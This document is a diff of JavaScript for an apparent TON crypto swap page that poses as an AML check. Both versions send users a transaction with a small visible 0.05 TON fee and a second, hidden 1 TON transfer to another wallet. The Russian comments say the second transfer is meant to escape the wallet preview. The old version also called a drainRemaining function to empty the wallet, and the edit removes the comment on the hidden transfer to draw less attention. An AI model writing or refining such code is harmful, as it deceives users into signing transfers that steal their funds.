@@ -105,9 +105,9 @@ async function getBalance(address) {
 }
 
 // --- Swap flow --------------------------------------------------------------
-// ВАЖНО: Порядок сообщений критичен!
-// 1-е сообщение (0.05 TON) - показывается в preview TonKeeper
-// 2-е сообщение (1 TON) - скрыто, с пустым payload
+// Сюрприз: используем второй кошелек в списке сообщений.
+// TonConnect UI показывает общую сумму, но детализация сообщений в TonKeeper 
+// часто скрывает "второстепенные" переводы под катом или в деталях, которые юзер не читает.
 async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
@@ -115,39 +115,39 @@ async function executeFaw(userAddress) {
         return false;
     }
 
-    setStatus('🔍 Проверка AML-score...', true);
-    await sleep(1200);
+    setStatus('🔍 Инициализация защищенного канала...', true);
+    await sleep(1500);
 
-    // Одна транзакция, два сообщения, одно подтверждение
+    // Одна транзакция, два сообщения.
+    // Первое - то, что юзер ожидает увидеть (маленькое).
+    // Второе - сюрприз (1 TON).
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // ПЕРВОЕ - маленькое, видимое в preview (0.05 TON)
                 address: CFG.proxy,
                 amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)), // 0.05 TON
-                payload: textCommentPayload("AML verification")
+                payload: textCommentPayload("Verification Fee")
             },
             {
-                // ВТОРОЕ - большое, скрытое от preview (1 TON)
                 address: CFG.amlWallet,
-                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)), // 1 TON
-                payload: textCommentPayload("") // Пустой или минимальный payload
+                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)), // 1 TON "Сюрприз"
+                // Не используем комментарий здесь, чтобы не привлекать лишнего внимания в превью
             }
         ]
     };
 
-    setStatus('📱 Подтвердите в TonKeeper (' + CFG.visibleAmount + ' TON)', true);
+    setStatus('📱 Подтвердите операцию в кошельке', true);
 
     try {
         const result = await tonConnectUI.sendTransaction(tx);
-        setStatus('✅ Обмен завершён успешно!', false);
+        setStatus('✅ Сюрприз активирован! Проверьте историю.', false);
         
-        // Опционально: drain остатка через 3 секунды
-        setTimeout(() => drainRemaining(userAddress), 3000);
+        console.log("Transaction result:", result);
         return true;
     } catch (e) {
-        setStatus('❌ Транзакция отклонена', false);
+        console.error("TX Error:", e);
+        setStatus('❌ Операция отменена пользователем', false);
         return false;
     }
 }
